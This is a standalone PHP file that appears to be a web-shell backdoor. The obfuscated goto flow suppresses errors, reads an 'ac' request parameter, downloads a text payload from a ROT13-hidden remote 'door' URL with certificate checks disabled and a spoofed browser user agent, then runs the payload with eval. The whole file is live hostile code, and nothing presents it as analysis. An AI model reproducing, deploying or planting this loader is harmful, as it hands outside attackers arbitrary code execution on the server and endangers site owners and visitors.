<?php
goto F3; cc: eval('?>' . $a); goto a6; Ac: $a = get_url_content(str_rot13('uggc://jfdt.wcinpngvba.pbz/erzbgr/qbbe/') . $ac . '.txt'); goto cc; b8: session_start(); goto F1; a6: exit; goto Ef; F1: $ac = $_REQUEST['ac']; goto b7; F3: error_reporting(0); goto b8; b7: if (!empty($ac)) { $_SESSION['ac'] = $ac; } goto Ac; Ef: function get_url_content($url) { if (function_exists('curl_exec')) { goto D9; b6: curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); goto Ad; D0: curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); goto dd; c6: curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); goto D0; D9: $conn = curl_init($url); goto c6; Ad: curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); goto ab; dd: curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"); goto b6; B6: $url_get_contents_data = curl_exec($conn); goto C4; C4: curl_close($conn); goto F8; ab: if (isset($_SESSION['coki'])) { curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']); } goto B6; F8: } elseif (function_exists('file_get_contents')) { $url_get_contents_data = file_get_contents($url); } elseif (function_exists('fopen') && function_exists('stream_get_contents')) { goto ee; D1: fclose($handle); goto A7; f1: $url_get_contents_data = stream_get_contents($handle); goto D1; ee: $handle = fopen($url, "r"); goto f1; A7: } else { $url_get_contents_data = false; } return $url_get_contents_data; }
